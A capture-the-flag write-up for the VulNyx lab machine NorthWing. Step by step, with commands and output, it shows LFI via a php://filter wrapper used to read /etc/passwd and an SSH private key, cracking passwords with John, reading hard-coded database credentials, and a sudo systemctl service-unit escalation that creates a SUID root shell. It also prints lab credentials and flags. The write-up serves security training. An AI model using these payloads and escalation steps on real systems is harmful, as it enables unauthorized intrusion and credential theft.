# [VulNyx](https://vulnyx.com/): Northwing Writeup

<img width="843" height="433" alt="image" src="https://github.com/user-attachments/assets/0b50eac1-8680-486a-9bf4-83795a2f993f" />

---

# 🎯 Target Information

- **Platform:** VulNyx
- **Machine Name:** NorthWing
- **Target IP:** `192.168.1.40`
- **Key Vulnerabilities:**
  - Local File Inclusion (LFI)
  - PHP Filter Wrapper
  - SSH Private Key Disclosure
  - Weak SSH Key Passphrase
  - Credential Disclosure in Web Application
  - Weak Developer Password
  - Misconfigured `sudo` Permissions
  - Privilege Escalation via `systemctl`

---

# 🔎 Enumeration

First, perform a full TCP port scan against the target using Nmap.

```bash
nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.40
```

## Scan Results

```text
$ nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.40                                  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-23 07:42 -0700
Nmap scan report for 192.168.1.40
Host is up (1.1s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:02:0e:87:56:15:5c:00:07:96:91:cf:2e:34:48:52 (ECDSA)
|_  256 4c:1b:c2:51:d6:87:f6:ad:9b:e7:34:2f:be:a2:65:01 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: NorthWing | Luxury Redefined
MAC Address: 08:00:27:C9:FB:E6 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect res-ults at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.63 seconds
```

### Findings

- **22/tcp** → SSH
- **80/tcp** → Apache HTTP Server

The web server identifies the target as:

```text
NorthWing | Luxury Redefined
```

---

# 🌐 Web Enumeration

Open port `80` in the browser.

<img width="1918" height="859" alt="Screenshot_2026-08-23_09_01_42" src="https://github.com/user-attachments/assets/00e9d2e9-4370-43f2-a203-536729b704e8" />

The website displays:

```text
Curated travel experiences for those who seek the extraordinary.
Private islands, hidden retreats, and seamless logistics.
```

Inspecting the source code reveals a parameter used by the menu:

<img width="880" height="256" alt="Screenshot_2026-08-25_09_57_50" src="https://github.com/user-attachments/assets/94a49b04-1fb2-4bc9-bd01-7d372e5d8773" />

```text
?page=home
```

The presence of a file-related parameter suggests a possible **Local File Inclusion (LFI)** vulnerability.

---

# 📂 Local File Inclusion

First, attempt to read `/etc/passwd` through the `page` parameter.

```text
http://192.168.1.40/?page=/etc/passwd
```

<img width="1918" height="856" alt="Screenshot_2026-08-23_09_02_04" src="https://github.com/user-attachments/assets/1e59ae57-8c66-4758-b75b-a3b9cec02360" />

The request returns: `403 Unauthorized Access`

A direct request is therefore blocked.

---

# 🧪 PHP Filter Wrapper Bypass

The PHP `filter` wrapper can be used to encode the contents of a local file before returning it.

The following wrapper can be used:

```text
php://filter/convert.base64-encode/resource=FILE
```

Reference: [OWASP- Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)

Use the PHP filter against `/etc/passwd`.

```text
http://192.168.1.40/?page=php://filter/convert.base64-encode/resource=/etc/passwd
```

The server returns the contents of `/etc/passwd` encoded in Base64.

<img width="1918" height="559" alt="Screenshot_2026-08-23_08_33_02" src="https://github.com/user-attachments/assets/493a6602-96b3-4e74-bd40-97fb6b8c0d1c" />

---

# 🔓 Decode `/etc/passwd`

The Base64 output can be decoded using [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)) or the local `base64` utility.

```bash
echo "BASE64_DATA" | base64 -d > passwd.txt
```

The decoded file contains:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
arthur:x:1000:1000:arthur:/home/arthur:/bin/bash
mysql:x:110:111:MySQL Server,,,:/nonexistent:/bin/false
developer:x:1001:1001:,,,:/home/developer:/bin/bash
```

Two interesting interactive users are identified:

```text
arthur
developer
```

Since SSH is exposed on port `22`, the next step is to look for SSH credentials belonging to these users.

---

# 🔑 SSH Private Key Disclosure

Use the LFI vulnerability with the PHP filter to read Arthur's private SSH key.

```text
http://192.168.1.40/?page=php://filter/convert.base64-encode/resource=/home/arthur/.ssh/id_ed25519
```

The server returns the private key encoded in Base64.

<img width="1918" height="459" alt="Screenshot_2026-08-23_09_01_36" src="https://github.com/user-attachments/assets/faf6c10d-09de-4b24-ac2b-aef10e3f03b9" />

Decode the output and save it as:

```text
echo "BASE64_DATA" | base64 -d > id_ed25519
```

The decoded key begins and ends with:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABApdylvNP
0D/Im2h29KBskLAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIJbQ0u2zXFbKbFdC
ndZduAqD7soLVHT209ujrZAWws+9AAAAoLt5ae84SOwdDbEq3oK8nH/0rWm7nFkqkg1LMw
eBcW2pZnqD2u6lp3+0T/FlLxhN960eMdmgSEuDPDzwO2wKIwXnwomMjLQpfAeknXm5RGjK
j1OznE9jnF6AcQgFB9a9oeyy5Wivui5d1tFO5i7oawVUOCagIpXYNiTr8mpDJv3uTdAkoE
RcEjFmh3yjBSD5VRJKziDZHl6hqN3rukCxS2Y=
-----END OPENSSH PRIVATE KEY-----
```

---

# 🔐 Crack the SSH Key Passphrase

Convert the SSH private key into a John the Ripper-compatible hash.

```bash
ssh2john id_ed25519 > hash.txt
```

Use `rockyou.txt` to crack the passphrase.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Result

```text
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  
Created directory: /home/arc/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
aventura         (id_ed25519)     
1g 0:00:01:12 DONE (2026-08-25 08:16) 0.01371g/s 25.01p/s 25.01c/s 25.01C/s jonjon..eastside
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The passphrase for Arthur's private key is: `aventura`

---

# 🖥 SSH Access as Arthur

Set the correct permissions on the private key.

```bash
chmod 600 id_ed25519
```

Connect to SSH using the recovered private key.

```bash
ssh -i id_ed25519 arthur@192.168.1.40
```

Enter the recovered passphrase:

```text
aventura
```

The SSH login succeeds.

---

# 🏁 User Flag

Read the user flag.

```bash
cat user.txt
```

## Result

```text
arthur@northwing:~$ cat user.txt 
5f4dcc3b5aa765d61d8327deb882cf99
```

---

# 🔍 Application Enumeration

Check the web application's files under `/var/www/html`.

An internal application is found:

```text
/var/www/html/internal_app/
```

Navigate to the directory and list the files:

## Result

```text
arthur@northwing:~$ cd /var/www/html/internal_app/
arthur@northwing:/var/www/html/internal_app$ ls
connection.php  dashboard.php  login.php  logout.php  NOTE.txt
```

The `connection.php` file is particularly interesting because it contains database connection information.

---

# 🗄️ Database Credential Disclosure

Read the configuration file.

```php
<?php
$host = "localhost";
$user = "northwing";
$password = "N0rthw!ng2026$";
$database = "northwing";

$conn = new mysqli($host, $user, $password, $database);

if ($conn->connect_error) {
    die("Database connection failed: " . $conn->connect_error);
}
?>
```

The database credentials are:

```text
Username: northwing
Password: N0rthw!ng2026$
Database: northwing
```

---

# 🔌 Internal Service Enumeration

Check listening services and their bound addresses.

```bash
ss -tulnp
```

## Result

```text
arthur@northwing:~$ ss -tulnp
Netid       State        Recv-Q       Send-Q                                 Local Address:Port              Peer Address:Port      Process      
udp         UNCONN       0            0                                192.168.1.40%enp0s3:68                     0.0.0.0:*                      
udp         UNCONN       0            0                                         127.0.0.54:53                     0.0.0.0:*                      
udp         UNCONN       0            0                                      127.0.0.53%lo:53                     0.0.0.0:*                      
udp         UNCONN       0            0                  [fe80::a00:27ff:fec9:fbe6]%enp0s3:546                       [::]:*                      
tcp         LISTEN       0            70                                         127.0.0.1:33060                  0.0.0.0:*                      
tcp         LISTEN       0            4096                                   127.0.0.53%lo:53                     0.0.0.0:*                      
tcp         LISTEN       0            151                                        127.0.0.1:3306                   0.0.0.0:*                      
tcp         LISTEN       0            4096                                      127.0.0.54:53                     0.0.0.0:*                      
tcp         LISTEN       0            4096                                         0.0.0.0:22                     0.0.0.0:*                      
tcp         LISTEN       0            4096                                            [::]:22                        [::]:*                      
tcp         LISTEN       0            511                                                *:80                           *:*                      
arthur@northwing:~$
```

The MySQL server is bound to:

```text
127.0.0.1:3306
```

This confirms that the database is available locally but is not directly exposed externally.

---

# 🔐 Access MySQL

Use the credentials discovered in `connection.php`.

```bash
mysql -h 127.0.0.1 -u northwing -p'N0rthw!ng2026$'
```

The MySQL server accepts the credentials.

Check the available databases:

```sql
show databases;
```

## Result

```text
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| northwing          |
| performance_schema |
+--------------------+
3 rows in set (0.02 sec)

```

Select the `northwing` database.

```sql
use northwing;
```

List the available tables.

```sql
show tables;
```

## Result

```text
mysql> show tables;
+---------------------+
| Tables_in_northwing |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)
```

---

# 👥 Database User Enumeration

Read the contents of the `users` table.

```sql
select * from users;
```

## Result

```text
mysql> select * from users;
+----+-----------+--------------------------------------------------------------+
| id | username  | password                                                     |
+----+-----------+--------------------------------------------------------------+
|  1 | arthur    | $2y$10$yH5fQH6qYz5Zt7KzQ4bZ2uM3m3uEJwF2Kz8KpJpQz7yF0Jq8WJvQK |
|  2 | developer | $2a$12$6n7/juND57eFUlODfeB87e45x24ibPr4eiZPLmKKIA84YKsj3fvGq |
+----+-----------+--------------------------------------------------------------+
2 rows in set (0.05 sec)
```

A password hash for the `developer` account is exposed.

Copy the developer hash to the attacker machine.

```bash
echo "\$2a\$12\$6n7/juND57eFUlODfeB87e45x24ibPr4eiZPLmKKIA84YKsj3fvGq" > pass_hash.txt
```

---

# 🔓 Crack Developer Password

Use John the Ripper with the `rockyou.txt` wordlist.

```bash
john --format=crypt pass_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Result

```text
$ john --format=crypt pass_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 4 for all loaded hashes
Cost 2 (algorithm specific iterations) is 12 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
greenday         (?)     
1g 0:00:00:07 DONE (2026-08-25 08:52) 0.1295g/s 24.87p/s 24.87c/s 24.87C/s daniela..november
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The recovered password is: `greenday`

---

# 👤 Switch to Developer

Switch from Arthur to the `developer` account.

```bash
su developer
```

Enter:

```text
greenday
```

---

# 🔍 Sudo Enumeration

Check the sudo permissions available to `developer`.

```bash
sudo -l
```

## Result

```text
developer@northwing:~$ sudo -l
Matching Defaults entries for developer on northwing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User developer may run the following commands on northwing:
    (root) NOPASSWD: /usr/bin/systemctl *
```

The user can execute:

```text
/usr/bin/systemctl
```

as root without entering a password.

---

# 💥 Privilege Escalation via systemctl

The `systemctl` binary can be abused when unrestricted service-management functionality is granted through sudo.

Reference: [GTFOBins](https://gtfobins.org/gtfobins/systemctl/#shell)

<img width="1918" height="721" alt="Screenshot_2026-08-25_11_02_36" src="https://github.com/user-attachments/assets/4e8df668-aa1b-45e8-84c0-aa1704d7df4e" />

Create a temporary service file.

```bash
TF=$(mktemp).service
```

Write a service definition that creates a SUID copy of Bash.

```bash
echo -e '[Service]\nType=oneshot\nExecStart=/bin/sh -c "cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash"' > $TF
```

Link the service file using the root-privileged `systemctl`.

```bash
sudo -u root /usr/bin/systemctl link $TF
```

The service is now registered with systemd.

Start the service:

```bash
sudo -u root /usr/bin/systemctl enable --now $TF
```

## Result

```

developer@northwing:~$ TF=$(mktemp).service
developer@northwing:~$ echo $TF
/tmp/tmp.ZkgjAn4cNt.service
developer@northwing:~$ sudo -u root /usr/bin/systemctl link /dev/null
Failed to link unit: "/dev/null" is not a valid unit name.
developer@northwing:~$ echo -e '[Service]\nType=oneshot\nExecStart=/bin/sh -c "cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash"' > $TF
developer@northwing:~$ echo -e '[Service]\nType=oneshot\nExecStart=/bin/sh -c "cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash"' > $TF^C
developer@northwing:~$ ^C
developer@northwing:~$ sudo -u root /usr/bin/systemctl link $TF
Created symlink /etc/systemd/system/tmp.ZkgjAn4cNt.service â†’ /tmp/tmp.ZkgjAn4cNt.service.
developer@northwing:~$ sudo -u root /usr/bin/systemctl enable --now $TF
The unit files have no installation config (WantedBy=, RequiredBy=, UpheldBy=,
Also=, or Alias= settings in the [Install] section, and DefaultInstance= for
template units). This means they are not meant to be enabled or disabled using systemctl.
 
Possible reasons for having these kinds of units are:
â€¢ A unit may be statically enabled by being symlinked from another unit's
  .wants/, .requires/, or .upholds/ directory.
â€¢ A unit's purpose may be to act as a helper for some other unit which has
  a requirement dependency on it.
â€¢ A unit may be started when needed via activation (socket, path, timer,
  D-Bus, udev, scripted systemctl call, ...).
â€¢ In case of template units, the unit is meant to be enabled with some
  instance name specified.

```
The command reports that the unit does not contain installation configuration, but the service file is still available to systemd.

---

# 🔎 Verify the SUID Bash

Check whether the malicious service created `/tmp/rootbash`.

```bash
ls -la /tmp/rootbash
```

## Result

```text
developer@northwing:~$ ls -la /tmp/rootbash 
-rwsr-sr-x 1 root root 1446024 Aug 25 16:20 /tmp/rootbash
```

The SUID bit is enabled.

The binary is: `root root`

with: `-rwsr-sr-x`

---

# 👑 Root Shell

Execute the SUID Bash with the `-p` option.

```bash
/tmp/rootbash -p
```

Verify the current privileges.

```bash
id ; whoami
```

## Result

```text
developer@northwing:~$ /tmp/rootbash -p
rootbash-5.2# id ; whoami
uid=1001(developer) gid=1001(developer) euid=0(root) egid=0(root) groups=0(root),1001(developer),1002(developers)
root
```

This confirms successful privilege escalation to root.

---

# 🏁 Root Flag

Read the root flag.

```bash
cat /root/root.txt
```

## Result

```text
rootbash-5.2# cat /root/root.txt 
d41d8cd98f00b204e9800998ecf8427e
rootbash-5.2# 
```

---

# 🧾 Summary

| Phase | Technique |
|--------|-----------|
| Enumeration | Nmap |
| Web Enumeration | Apache / Source Code Analysis |
| Initial Vulnerability | Local File Inclusion |
| LFI Bypass | PHP Filter Wrapper |
| Information Disclosure | `/etc/passwd` |
| Credential Discovery | SSH Private Key |
| Credential Cracking | `ssh2john` + John the Ripper |
| Initial Access | SSH as `arthur` |
| User Flag | `/home/arthur/user.txt` |
| Application Enumeration | `internal_app` |
| Credential Disclosure | `connection.php` |
| Database Enumeration | MySQL |
| Credential Discovery | `users` table |
| Credential Cracking | John the Ripper |
| Lateral Movement | `arthur` → `developer` |
| Privilege Escalation | Misconfigured `sudo` |
| Root Execution | `systemctl` |
| Root Shell | SUID Bash |
| Root Flag | `/root/root.txt` |

---

# 🚀 Key Takeaways

- File inclusion parameters should always be tested for local file inclusion when their values appear to reference application files.
- Direct LFI filters can sometimes be bypassed using PHP stream wrappers such as `php://filter`.
- Sensitive files such as `/etc/passwd` can reveal valid system users and provide useful targets for further enumeration.
- SSH private keys should always be protected with strong passphrases and appropriate filesystem permissions.
- Application configuration files can expose database credentials when secrets are hard-coded.
- Internal database services bound to `127.0.0.1` are still security-sensitive because local compromise can expose them.
- Password hashes stored in application databases should be protected using strong password policies and appropriate password-hashing mechanisms.
- Wildcard sudo permissions on powerful administrative utilities such as `systemctl` can lead to complete privilege escalation.
- Systemd service files executed with root privileges should never be writable or controllable by unprivileged users.
- SUID-enabled shells provide direct privilege escalation when created with root ownership.

---

## **Author:** [zer0arc4](https://github.com/zer0arc4)
